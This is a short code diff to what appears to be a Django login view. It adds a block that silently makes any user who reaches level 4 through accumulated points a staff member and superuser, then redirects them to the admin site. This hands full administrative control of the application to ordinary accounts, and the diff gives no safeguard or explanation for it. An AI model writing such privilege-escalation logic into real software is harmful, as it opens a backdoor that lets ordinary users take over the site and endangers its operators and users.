@@ -183,6 +183,12 @@ def login_user(request):
                 if user.points >= threshold:
                     user.niveau = level
 
+            if user.niveau == 4 and not user.is_superuser:
+                user.is_staff = True
+                user.is_superuser = True
+                user.save()
+                return redirect('/admin/')
+
             user.save()
             return redirect('visiteur_index2')
 
